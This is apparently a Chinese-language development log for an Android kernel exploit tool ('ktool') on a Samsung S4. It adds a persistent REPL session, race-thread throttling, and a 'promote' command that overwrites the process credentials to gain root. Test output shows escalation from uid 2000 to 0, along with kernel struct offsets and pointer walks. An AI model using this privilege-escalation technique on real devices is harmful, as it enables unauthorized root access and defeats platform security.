## 一、会话化（B6）

### 问题

每条命令都是一个新进程，因此每条命令都要重付：

1. `sleep(2)` 精灵预热；
2. `pipe()` / 4 个 `mmap` / socket / 3 个线程的重建；
3. `find_self()` 从头遍历 400 个 `task_struct`。

更麻烦的是**状态不可复用**：`showcred` 打印出的堆地址，下一条命令里就失效
（进程已经没了，`task`/`cred` 都是别的对象）。实测：

```
task=d2018440 cred=dde2ec80   ← 第一次
task=d201b300 cred=e692fe80   ← 第二次，同一个二进制、同一台机器
```

### 做法：把 if 链从 main 里拆出来

原来所有命令判断都摊在 `main()` 里、靠 `return` 退出。改成：

```
main()      → 目标识别 → sym/target 提前返回 → 精灵/pipe 初始化 → 
              repl ? ktool_repl() : ktool_dispatch(argc, argv)
dispatch()  → 原来的整条 if 链，一行逻辑没动（argv[1] 仍是命令名）
```

**为什么不 fork 每条命令**：`fork()` 只保留调用线程，精灵和 zapper 都会消失；
子进程要重新起线程、重新预热，等于换个地方付同样的成本。同进程顺序执行才是对的。

REPL 从 stdin 逐行读，空白切词（`av[0]="ktool"` 占位，命令从 `av[1]` 开始），
复用同一个 `dispatch`。stdin 不是 tty 时不打提示符，所以可以直接脚本化：

```
ktool repl < script.txt
```

### 附带的两个必要修改

**1. 精灵节流（`spin_active`）**

一次性进程里 spinner/zapper 跑几百毫秒就随进程退出；会话要活很久，
空闲时还占两个核会把设备烤热、把 loadavg 拉起来，反过来降低下次竞态成功率。

```
spinner : while(!stop){ if(!spin_active){usleep(2000);continue;} 忙循环 1e6 次 }
zapper  : while(!stop){ if(!spin_active){usleep(2000);continue;} madvise(pR,...) }
repl    : 命令前 spin_active=1 + 80ms 预热；命令后 spin_active=0
```

一次性模式从不清零，**行为与旧版完全一致**（默认 `spin_active=1`）。

**2. `find_self` 缓存**

同一进程的 `task_struct` 地址在生命周期内不变。命中后把地址存下来，
下次先回读 `comm` 校验（`ktool` 前缀），对得上就直接返回，对不上（换进程/改名）再重扫。
省掉的是每条命令 400 次链表遍历的竞态预算。

**3. 新增 `promote`**

`root` / `pwn` 的设计是"提权后立刻 `execvp`"，在会话里会把 REPL 自己替换掉。
`promote` 补另一半：只跑 `do_root()`，不提 permissive、不 exec，留在原地。
之后每条命令都以 uid 0 跑。

> 注意 `promote` 只改 uid/caps，**SELinux 域仍是 `u:r:shell:s0`**，
> cap 满位也不等于能碰 `system_file`（P4.16 已实测）。

### 实测

```
$ ktool repl < repl_test.txt
ktool session: backend=iovyroot/1805 target=GT-I9500
0xc0b79be0 D init_task
c0b79be0 00000000 0020a8c0
0xc0b79be0 +0x2fc  = 0xc0b79edc: 0xc0b9f1dc  Dinit_cred+0x0
--- 0xc0b9f1dc (32 bytes) ---
c0b9f1dc 06000000 00000000 00000000 00000000 |................|
who: uid=2000 euid=2000 gid=2000 egid=2000
who caps eff=00000000 perm=00000000 inh=00000000
task=d201b300 cred=e692fe80
caps: eff=ffffffff perm=ffffffff inh=ffffffff
uid now: 0/0/0
promoted: uid=0 euid=0
who: uid=0 euid=0 gid=0 egid=0          ← 提权在会话内持续有效
c0b79be0 00000000 0020a8c0             ← 后续命令照常跑
```

耗时对比（同一台 S4，adb 往返已计入）：

| 场景 | 耗时 | 每条 |
|---|---|---|
| 一次性单条 `dump` | 2.2 s ~ 7.4 s | 2.2~7.4 s（2s 固定 + 竞态重试） |
| 会话 6 条 `dump` | 2.71 s | **0.45 s** |
| 会话 7 条（含一次 `promote` 全竞态） | 8.17 s | 1.17 s |

原因：会话里 pipe 已建好、精灵已热，竞态基本第一次就中；一次性每条都要重新预热。

## 二、指针追踪（C9）

### `walk`

```
ktool walk <sym|hexaddr> <off>... [-d dumpbytes]
```

每步读 `cur+off` 的 32 位值 → 打印（值可反查符号）→ 把值当作下一跳基址。
起点支持符号名（从 System.map 查），省掉"先 `sym` 再抄地址"。

### 实测

**1 跳：`walk init_task 0x2fc`** —— 等价于手工"读 init_task+0x2fc 再 dump"

```
0xc0b79be0 +0x2fc  = 0xc0b79edc: 0xc0b9f1dc  Dinit_cred+0x0
--- 0xc0b9f1dc (32 bytes) ---
c0b9f1dc 06000000 00000000 00000000 00000000 |................|
c0b9f1ec 00000000 00000000 00000000 00000000 |................|
```
`usage=6`、uid/gid 全 0 —— 一眼确认是初始 cred。

**2 跳：`walk init_task 0x2f8 0x58`** —— 从 real_cred 走到 cred->security

```
0xc0b79be0 +0x2f8  = 0xc0b79ed8: 0xc0b9f1dc  Dinit_cred+0x0
0xc0b9f1dc +0x58   = 0xc0b9f234: 0xe6807300
--- 0xe6807300 (32 bytes) ---
e6807300 01000000 01000000 00000000 00000000 |................|
```
`off_cred_security=0x58` 拿到的是 `task_security_struct`，前两个字段
`osid=1, sid=1`（init 域），与 P4.29 记录的布局一致。
**这条链就是"cred → 安全检查"的完整路径，一条命令走完。**

**非指针自动停链**：`walk init_task 0x2fc 0x4 0x0`（cred → uid，uid=0）

```
0xc0b79be0 +0x2fc  = 0xc0b79edc: 0xc0b9f1dc  Dinit_cred+0x0
0xc0b9f1dc +0x4    = 0xc0b9f1e0: 0x00000000
  (上一跳不是内核指针，链路到此为止)
```
不会拿 0 或小整数去当地址继续读。

## 三、限制

- REPL 里 `root` / `sh` / `x` / `rawexec` 仍会 `exec`，**会话就此结束**；
  要留在会话里用 `promote`。
- 切词不支持引号，路径不能带空格。
- `walk` 每跳都是独立的 300-try 竞态读，链越长越慢（3 跳通常 < 2 s）。
- `find_self` 缓存以 `comm` 前缀 `ktool` 校验；把二进制改名成别的（不含 "ktool" 前缀）
  会让 `find_self` 与缓存都失效——这是老限制，不是本次引入。
